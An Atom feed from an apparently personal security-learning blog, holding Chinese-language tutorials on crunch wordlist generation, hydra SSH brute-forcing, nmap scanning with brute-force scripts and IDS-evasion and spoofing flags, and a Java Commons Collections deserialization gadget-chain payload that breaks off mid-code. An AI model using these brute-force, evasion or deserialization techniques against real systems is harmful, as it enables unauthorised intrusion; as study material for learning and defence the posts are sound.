<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Winky&#39;s Blog</title>
  
  <subtitle>一个正在努力的小开发</subtitle>
  <link href="https://winkygranger.github.io/atom.xml" rel="self"/>
  
  <link href="https://winkygranger.github.io/"/>
  <updated>2023-01-21T08:58:32.169Z</updated>
  <id>https://winkygranger.github.io/</id>
  
  <author>
    <name>Winky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>操作系统</title>
    <link href="https://winkygranger.github.io/2023/01/20/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3/"/>
    <id>https://winkygranger.github.io/2023/01/20/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3/</id>
    <published>2023-01-20T14:00:00.000Z</published>
    <updated>2023-01-21T08:58:32.169Z</updated>
    
    <content type="html"><![CDATA[<p>crunch字典生成、hydra九头蛇工具</p><span id="more"></span><h1 id="crunch简介"><a href="#crunch简介" class="headerlink" title="crunch简介"></a>crunch简介</h1><ul><li>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。</li><li>使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。知道密码的一部分细节后，可以针对性的生成字典。</li></ul><h1 id="crunch基本语法"><a href="#crunch基本语法" class="headerlink" title="crunch基本语法"></a>crunch基本语法</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line">crunch 密码最小长度 密码最大长度 [字符集] [命令选项] </span><br></pre></td></tr></table></figure><h2 id="特殊意义字符"><a href="#特殊意义字符" class="headerlink" title="特殊意义字符"></a>特殊意义字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ 代表小写字母</span><br><span class="line">, 代表大写字母</span><br><span class="line">% 代表数字</span><br><span class="line">^ 代表特殊字符</span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3/1673765984944-74a1b12c-e07c-4ccb-91f8-12e21e4c35ce.png"></p><h2 id="命令选项"><a href="#命令选项" class="headerlink" title="命令选项"></a>命令选项</h2><p><code>-o：</code> 输出生成的密码到指定的文件;<br><code>-z：</code> 压缩生成的字典文件，有效的参数是gzip, bzip2, lzma, and 7z，其中gzip压缩最快，bzip2压缩速度比gzip慢单压缩效率比gzip好，7z压缩速度最慢，但是压缩效率最高。<br><code>-f：</code> 调用密码库文件，例如：/usr/share/crunch/charset.lst;<br><code>-t：</code> 定义密码输出格式（@代表插入小写字母、，代表插入大写字母、%代表插入数字、^代表插入符号）</p><p><code>-b：</code> 按指定的大小单位分割字典文件成若干个指定的大小的字典，避免一个字典文件过大，</p><p><code>-c：</code> 指定要写入字典文件中的行数，只在有 -o START参数时才生效，单个字典超过指定的行数会被分割成两个或多个字典文件。例如： -c 5000<br><code>-d：</code> 限制同一字符连续出现的数量， -d 2 表示限制一个字符最多连续出现2次如 aabd，ccda。aaab就表示超过了2个字符连续的限制了。<br><code>-e：</code> 定义到那个字符串就停止生成密码，例如： -e 999999 就表示在生成密码到99999时就停止生成密码<br><code>-i：</code> 改变输出格式，例如： 原本输入为aaa,aab,aac,aad再使用了-i之后，就会变成aaa,baa,caa,daa的格式了<br><code>-p：</code> 定义密码元素<br><code>-q：</code> 读取密码元素<br><code>-r：</code> 定义从某一个地方重新开始<br><code>-s：</code> 第一个密码，从自己定义的密码xxx开始</p><p><code>-u：</code> 禁用printpercentage线程。这应该是最后一个选择</p><p>crunch查看库文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/crunch/charset.lst</span><br></pre></td></tr></table></figure><ul><li><p>生成1-8位密码字典，字符集合为小写字母，从a开始，zzzzzzzz结束</p></li><li><ul><li><code>crunch 1 8</code></li></ul></li><li><p>生成1-6位的密码字典，字符集合为【abcdefg】,从a开始到gggggg结束</p></li><li><ul><li><code>crunch 1 6 abcdefg</code></li></ul></li><li><p>生成3位的密码字典，字符集为【ab 】从a开始 【 b】结束</p></li><li><p>生成指定字符串，比如生日的日期</p></li><li><ul><li><code>crunch 8 8 -t 1997307%% -e 19930730</code>     </li></ul></li><li><p>生成元素的组合，比如比如123.com</p></li><li><ul><li><code>crunch 7 7 -t %%%.com -s 111.com -e 123.com</code> </li></ul></li><li><p>在字典中输出特殊字符</p></li><li><ul><li><code>crunch 3 3 abc -t @@@ -l @aa</code></li></ul></li><li><p>自定义字符集合生成【*.com】字典文件</p></li><li><ul><li><code>crunch 5 5 -f charset.lst hex-lower -t @.com</code></li></ul></li><li></li></ul><h1 id="hydra九头蛇用法"><a href="#hydra九头蛇用法" class="headerlink" title="hydra九头蛇用法"></a>hydra九头蛇用法</h1><p><code>-l： </code>   指定一个用户名</p><p><code>-L：</code>   指定用户名字典</p><p><code>-p：</code>    指定一个密码</p><p><code>-P：</code> 指定密码字典</p><p><code>-vV：</code>  显示爆破细节</p><p><code>-o：</code>  保存爆破结果</p><p><code>-f：  </code>找到正确结果后停止爆破</p><p><code>-t：</code>  线程（默认16）</p><p><code>-e：  </code></p><p>​    <code>n：</code> null</p><p>​    <code>s：</code> same</p><p>​    <code>r：</code> 反向</p><p>生成用户名字典<code>userName.txt</code>和密码字典<code>password.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L userName.txt  -P  password.txt  ssh://192.168.2.29</span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3/1674221758843-01060ef3-c818-42b9-9ab4-7b92552994a2.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;crunch字典生成、hydra九头蛇工具&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://winkygranger.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="口令破解" scheme="https://winkygranger.github.io/tags/%E5%8F%A3%E4%BB%A4%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>信息收集之Nmap</title>
    <link href="https://winkygranger.github.io/2022/12/30/nmap/"/>
    <id>https://winkygranger.github.io/2022/12/30/nmap/</id>
    <published>2022-12-30T13:03:41.000Z</published>
    <updated>2023-01-19T14:19:44.762Z</updated>
    
    <content type="html"><![CDATA[<p>nmap常用命令</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>nmap是安全渗透领域最知名最强大的端口扫描器。能够跨平台运行，支持IP、端口、操作系统、应用服务等信息探测，支持基于脚本的扫描。除了基于命令行实现，目前也支持通过自带的Zenmap来实现图形化操作。</p><h1 id="2-2-用法"><a href="#2-2-用法" class="headerlink" title="2.2 用法"></a>2.2 用法</h1><p>nmap+扫描类型+参数+目标地址</p><p>nmap -sn 192.168.133.0/24<strong>对目标网段进行活跃主机扫描，不进行端口扫描，通过发送ping包扫描。</strong></p><p>nmap+目标IP <strong>扫描目标1~1024端口和服务</strong></p><p>nmap -iL +加入含有目标地址的文件名（多目标）</p><p>nmap -iR 100 -p80 <strong>随机扫描一百个地址的80端口（ping包扫描）</strong></p><p>nmap –exclude+目标地址+目标网段 <strong>扫描目标网段排除改目标地址</strong></p><p>nmap –excludefile+文件 +目标网段 -p21 <strong>扫描网段中除了文件中包含的IP外的21端口</strong></p><p>nmap -sP+目标地址 <strong>采用ICMP扫描。扫描该IP的mac地址，和跳数</strong></p><p>nmap -p+端口 -O+目标地址 <strong>对目标地址操作系统进行无ping扫描</strong></p><p>nmap -PS+目标地址 <strong>对目标地址进行SYN扫描，不指定端口默认80发送SYN包。 -PA使用ACK扫描</strong></p><p>nmap -sU +目标地址 <strong>使用UDP扫描</strong></p><p>nmap -O -Pn/-p0 +目标地址 <strong>其中Pn和p0参数的意思是不使用ping的方式，而且假定所有主机系统都是存活的，可以穿透防火墙，也可以避免被防火墙发现</strong></p><p>nmap -PR+目标地址 <strong>使用ARP扫描（ARP扫描和ping扫描的区别，ARP扫描速度比ping扫描快，并且可以绕开防火墙，但是仅限于局域网）</strong></p><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p><code>open</code>，端口开放，应用程序正在该端口接受TCP/UDP连接</p><p><code>closed</code>，端口关闭，但是对于nmap来说仍然可以访问，可以接受nmap探测并作出响应，但没有应用程序运行</p><p><code>filter</code>，过滤，由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放，过滤可能来自专业的防火墙设备，或者是路由器规则，或者是电脑、服务器上的安全软件</p><p><code>unfilter</code>，未过滤，但是nmap不能确定是否开放。</p><p><code>open|filtered</code> ，无法确定端口是开放还是被过滤的</p><p><code>closed|filterd</code>，无法确定端口关闭或者被过滤</p><p>-sS/sA/半开扫描分别为SYN/ACK扫描。-sF采用FIN扫描，更加隐蔽，同时也可以用它来探测防火墙状态。-sT TCP全开扫描，不建议用全开扫描，因为会建立握手连接，留下痕迹，被日志记录，或报警。</p><p>nmap -sV +目标地址 <strong>用来探测开放端口服务的版本信息。</strong></p><p>nmap -A +目标地址 <strong>全面扫描信息，扫描到的信息全面，但是速度慢。</strong></p><h1 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h1><h2 id="Nmap脚本扫描"><a href="#Nmap脚本扫描" class="headerlink" title="Nmap脚本扫描"></a>Nmap脚本扫描</h2><p>nmap –script=default 192.168.199.174 默认脚本进行扫描</p><p>nmap –script=auth 172.16.70.213 检测部分应用弱口令</p><p>nmap –script=brute 192.168.199.174 进行简单的暴力破解</p><p>nmap –script=vuln 192.168.199.174 检测是否存在常见漏洞</p><p>nmap –script=broadcast 192.168.199.174 对局域网进行更多的服务探测</p><p>nmap –script=smb-brute.nse 192.168.199.174 smb服务扫描</p><p>nmap –script=smb-cheek-vulns.nse –script-args=unsafe=192.168.199.174 进行smb漏洞扫描</p><p>nmap –script=telnet-brute 192.168.133.131 对telnet服务破解</p><p>nmap -p3306 –script=mysql-empty-password.nse 192.168.133.131 对mysql进行空口令扫描</p><p>nmap –script=ssh-hostkey.nse 192.168.133.131 要求扫描出ssh的key</p><p>nmap –script=ssh-* 192.168.133.131 调用所有的SSH脚本进行扫描</p><p>nmap –script=http-* 192.168.133.131 调用所有http脚本进行扫描</p><p>nmap –script=mysql-* 192.168.133.131 调用所有的mysql脚本进行扫描</p><h2 id="Nmap防御绕过扫描"><a href="#Nmap防御绕过扫描" class="headerlink" title="Nmap防御绕过扫描"></a>Nmap防御绕过扫描</h2><p>防火墙/IDS逃避和欺骗：</p><p>-F；–mtu<val>：分片数据包（可选地w/给定的MTU）</val></p><p>-D &lt;decoy1,decoy2,ME 真实IP ，…&gt;:使用诱饵隐藏扫描</p><p>-S <IP_Address>:欺骗源地址</IP_Address></p><p>-e <ifrace>:指定接口</ifrace></p><p>-g/–source-port <portnum>: 使用给定端口号</portnum></p><p>–proxies &lt;url1,[url2],….&gt;：通过HTTP/SOCKS4代理中继连接</p><p>–data <hex string>: 将自定义的有效负载附加到发送的数据包</hex></p><p>–data-length <num>: 将随机数据附加到发送的数据包</num></p><p>–data-string <string>: 将自定义的ASCII字符串附加到发送的数据包中</string></p><p>–ip-options <options>:发送带有指定ip选项的数据包</options></p><p>–ttl <val>: 设置IP生存时间字段</val></p><p>–spoof-mac &lt;mac地址/前缀/供应商名称&gt;：欺骗你的MAC地址</p><p>–badsum：发送带有虚假TCP/UDP/SCTP校验的数据包</p><p><strong>wireshark:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr = 192.168.2.2 and tcp.port = 8070</span><br></pre></td></tr></table></figure><p>kali虚拟机扫描物理机8070端口的结果</p><p><img src="/2022/12/30/nmap/1673337951915-00f8b9fd-5d2c-441f-a52a-ebd337c8a0a3.png"></p><p><img src="/2022/12/30/nmap/1673338009734-5ff3a688-eee9-4587-8c0d-04e0460849d6.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;nmap常用命令&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://winkygranger.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="nmap" scheme="https://winkygranger.github.io/tags/nmap/"/>
    
    <category term="信息收集" scheme="https://winkygranger.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://winkygranger.github.io/2022/12/22/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://winkygranger.github.io/2022/12/22/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-12-22T13:03:41.000Z</published>
    <updated>2023-01-19T08:29:28.965Z</updated>
    
    <content type="html"><![CDATA[<p>payload</p><span id="more"></span><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a><strong>序列化和反序列化</strong></h1><p>序列化:是将对象的状态信息转换为可以存储或传输形式的过程。<br>反序列化:将对象数据从按照某一种标准，解析成对象，读取到内存。<br><strong>那为什么要将对象序列化，或者说他的应用场景有哪些?</strong></p><ul><li>我们都知道，程序运行，对象数据是保存到内存中的，那如果对象很多，会占据很多内存空间，但我们的内存是有限的，而且很贵，所以,需要长时间保存的对象，我们可以将这些对象保存到硬盘中，一方面，硬盘比内存便宜另一方面为了数据安全，内存断电数据就丢失了，但对象是一个抽象的数据结构，怎么保存到硬盘中，我们可以将对象，按照Io格式转换成一个字符串或者某个二进制的文件，这个就叫做序列化。</li><li>还有一种情况，我们都知道服务器和服务器之间通讯，肯定要传输数据，数据传输肯定要约定某一个格式，所以说如果要传输对象，我们也需要将对象转换成每一种特定的格式，这也是序列化的一种应用场景。</li></ul><p><strong>一个类的对象要想序列化成功，必须满足两个条件</strong></p><ul><li>该类必须实现<code>java.io.Serializable</code>接口。</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ul><p>该类有实现java.io.Serializable接口，在反序列化的时候会执行<code>readObject()</code>方法，举例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerialTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//默认执行的readObject()代码</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//调用服务器命令脚本</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">fis</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fis);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SerialTest</span> <span class="variable">winky</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialTest</span>(<span class="string">&quot;Winky&quot;</span>, <span class="number">24</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serializable(winky);</span><br><span class="line">            unSerializable();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(SerialTest s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\a.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//创建对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">        <span class="comment">//将对象序列化</span></span><br><span class="line">        objOut.writeObject(s);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line">        file.close();</span><br><span class="line">        objOut.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerializable</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">inFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:\\a.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inFile);</span><br><span class="line">        <span class="type">SerialTest</span> <span class="variable">serialTest</span> <span class="operator">=</span> (SerialTest) objIn.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> serialTest.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">        inFile.close();</span><br><span class="line">        objIn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="构建类的要求"><a href="#构建类的要求" class="headerlink" title="构建类的要求"></a>构建类的要求</h1><ul><li>实现<code>Serializable</code>接口</li><li>重写<code>readObject()</code>方法</li><li>恶意命令可控（比如可以执行任意类的任意方法：反射实现）</li><li>类必须存在与应用程序（比如自带类库、第三方<code>jar</code>包）</li></ul><h2 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h2><p><code>Apache Commons Collections</code>是一个扩展了Java标准库里的Collection结构的第三方基础库。<br><code>org.apache.commons.collections</code>提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于<code>collection</code>的基本概念，只是功能不同罢了。Java中的<code>collection</code>可以理解为一组对象，<code>collection</code>里面的对象称为collection的对象。具象的<code>collection</code>为set，list，queue等等，它们是集合类型。换一种理解方式,<code>collection</code>是set，list,queue的抽象。<br><strong>但是，如果readObject这个方法里面或者调用的方法里面，存在能够执行任意类的任意方法的逻辑，我们是不是就闭环了。</strong><br>在java里面什么东西可以执行执行任意类的任意方法?</p><p>在<code>InvokerTransformer</code>实现类中重写了<code>transform</code>方法，传入的参数类型为<code>Object</code>，且通过反射可以执行里面的任意的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="comment">//通过反射传入方法名称和类型</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        exec.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是上述代码并没有满足重写<code>readObject()</code>方法<br><code>TransformedMap</code>类实现了<code>Serializable</code>方法，并且重写了<code>readObject()</code>方法。<br>由于<code>TransformedMap</code>构造器是<code>protected</code>修饰的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected修饰的</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用此方法可以new一个对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//分别获取 getRuntime() , invoke() , exec() 方法 , 然后将这些实例对象添加到 this.iTransformers 数组中 , 从而获得一条完整的调用链</span></span><br><span class="line">          Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">              <span class="keyword">new</span> <span class="title 